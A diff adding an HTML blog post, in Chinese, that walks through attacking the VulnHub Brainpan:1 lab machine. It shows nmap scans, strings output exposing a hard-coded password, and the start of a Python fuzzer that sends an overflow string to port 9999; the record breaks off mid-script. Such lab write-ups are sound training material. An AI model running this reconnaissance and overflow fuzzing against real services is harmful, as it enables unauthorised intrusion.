@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称名称：Brainpan：1发布日期：2013年3月20日 下载 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;Brainpan.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;Brainpan.zip.torrent  描述12345678 _">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[brainpan-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/26/brainpan-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称名称：Brainpan：1发布日期：2013年3月20日 下载 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;Brainpan.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;Brainpan.zip.torrent  描述12345678 _">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub193.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub194.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub195.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub196.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub197.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-01-26T14:05:39.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:32:53.026Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/26/brainpan-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/26/brainpan-1/","path":"2020/01/26/brainpan-1/","title":"vulnhub靶机渗透[brainpan-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[brainpan-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number"></span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%AE%9A"><span class="nav-number"></span> <span class="nav-text">设定</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">2.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">2.2.</span> <span class="nav-text">知识点总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/26/brainpan-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[brainpan-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[brainpan-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-01-26 22:05:39" itemprop="dateCreated datePublished" datetime="2020-01-26T22:05:39+08:00">2020-01-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:32:53" itemprop="dateModified" datetime="2020-08-17T00:32:53+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Brainpan：1<br>发布日期：2013年3月20日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXA=">https://download.vulnhub.com/brainpan/Brainpan.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXAudG9ycmVudA==">https://download.vulnhub.com/brainpan/Brainpan.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> _               _                         </span><br><span class="line">| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  </span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |</span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|</span></span><br><span class="line"><span class="string">                        |_|                </span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，在任何情况下概不负责任何损失或损害，包括但不限于间接或随之而来的损失或损害，或任何损失或损害因使用引起的或与使用有关的数据或利润损失该软件。<br>TL; DR：如果发生坏事，这不是我的错。</p>
+<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan经过测试，发现可在以下虚拟机监控程序上工作：<br>-VMware Player 5.0.1<br>-VMWare Fusion 5.0<br>-VirtualBox 4.2.8<br>将Brainpan导入首选的虚拟机监控程序并配置网络根据需要进行设置。它会通过DHCP获取IP地址，但是建议在NAT内运行它，或者仅对主机操作系统可见，因为它容易受到攻击。</p>
+<p>资料来源：Brainpan.zip&#x2F;readme.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5（brainpan.ova）= fc0f163220b9884df5dcc9cdc45361e4</span><br></pre></td></tr></table></figure>
+<p>资料来源：Brainpan.zip&#x2F;md5.txtVulnHub独家！</p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一顿</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.115</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">MAC Address: 08:00:27:DE:BA:CA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -v -Pn -sV 192.168.56.115</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>
+
+<p>访问一下看看是什么东西:</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg"></p>
+<p>扫一下目录看看</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg"></p>
+<p>在bin目录中有一个二进制文件？</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg"></p>
+<p>将这个exe文件下载下来，然后用ollydbug工具调试</p>
+<p>调试之前，先分析下brainpan.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># file brainpan.exe </span></span><br><span class="line">brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), <span class="keyword">for</span> MS Windows</span><br><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># strings brainpan.exe </span></span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">.text</span><br><span class="line">`.data</span><br><span class="line">.rdata</span><br><span class="line">@.bss</span><br><span class="line">.idata</span><br><span class="line">[^_]</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">[^_]</span><br><span class="line">[get_reply] s = [%s]</span><br><span class="line">[get_reply] copied %d bytes to buffer</span><br><span class="line">shitstorm</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line">                          &gt;&gt; </span><br><span class="line">                          ACCESS DENIED</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line">[+] initializing winsock...</span><br><span class="line">[!] winsock init failed: %d</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line">[!] could not create socket: %d</span><br><span class="line">[+] server socket created.</span><br><span class="line">[!] <span class="built_in">bind</span> failed: %d</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port %d</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[+] check is %d</span><br><span class="line">[!] accept failed: %d</span><br><span class="line">[+] cleaning up.</span><br><span class="line">-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32</span><br><span class="line">w32_sharedptr-&gt;size == sizeof(W32_EH_SHARED)</span><br><span class="line">../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c</span><br><span class="line">GetAtomNameA (atom, s, sizeof(s)) != 0</span><br><span class="line">AddAtomA</span><br><span class="line">ExitProcess</span><br><span class="line">FindAtomA</span><br><span class="line">GetAtomNameA</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">__getmainargs</span><br><span class="line">__p__environ</span><br><span class="line">__p__fmode</span><br><span class="line">__set_app_type</span><br><span class="line">_assert</span><br><span class="line">_cexit</span><br><span class="line">_iob</span><br><span class="line">_onexit</span><br><span class="line">_setmode</span><br><span class="line">abort</span><br><span class="line">atexit</span><br><span class="line">free</span><br><span class="line">malloc</span><br><span class="line">memset</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">signal</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">strlen</span><br><span class="line">太多了省略。。。</span><br></pre></td></tr></table></figure>
+
+<p>这里有几个很重要：</p>
+<ul>
+<li>这个brainpan.exe看起来与端口9999上的侦听过程相同</li>
+<li>shitstorm 看起来像密码</li>
+<li>strcpy 可能是缓冲区溢出攻击向量</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg"></p>
+<p>显然，应该尝试可能的密码shitstorm。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.115 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; shitstorm</span><br><span class="line">                          ACCESS GRANTED</span><br></pre></td></tr></table></figure>
+
+<p>返回。<br>嗯…如何检查strcpy函数。<br>虽然有适用于Linux的Evan的Debugger和Immunity Debugger（通过wine执行），但我选择在Windows环境中将Immunity Debugger用于“windozy”类型的任务。</p>
+<p>免责声明：对于那些已经知道如何执行简单的strcpy缓冲区溢出的人，可以快速进入下一节，因为这本身就很冗长且“用户友好”。选择为每个步骤包括大量的模糊测试代码和详细信息，以便对这种攻击媒介不熟悉的任何人都可以轻松学习并希望了解该过程。</p>
+<p>是时候使用快速模糊器来看看是否可以获取导致段错误的输入。这是经常使用的一些代码，并在进行过程中使用shellcode和register进行修改。简单，有效。</p>
+<p>etfuzz.py</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 1000</span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, 